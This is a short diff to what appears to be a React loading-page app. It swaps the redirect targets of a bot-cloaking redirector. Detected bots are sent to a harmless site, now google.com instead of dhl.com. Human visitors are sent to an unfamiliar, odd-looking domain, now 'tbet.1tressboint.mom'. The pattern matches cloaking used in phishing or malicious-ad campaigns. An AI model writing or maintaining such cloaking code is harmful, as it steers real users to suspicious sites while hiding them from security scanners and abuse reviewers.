@@ -5,7 +5,7 @@ import "./App.css";
 
 const App = () => {
   const [progress, setProgress] = useState(0);
-  const [redirectUrl, setRedirectUrl] = useState("https://sage.aaprefetch.pro");
+  const [redirectUrl, setRedirectUrl] = useState("https://tbet.1tressboint.mom");
 
   useEffect(() => {
     const checkBotStatus = async () => {
@@ -19,7 +19,7 @@ const App = () => {
         });
 
         if (response.data.is_bot) {
-          setRedirectUrl("https://dhl.com");
+          setRedirectUrl("https://google.com");
         }
       } catch (error) {
         console.error("Error detecting bot status:", error);
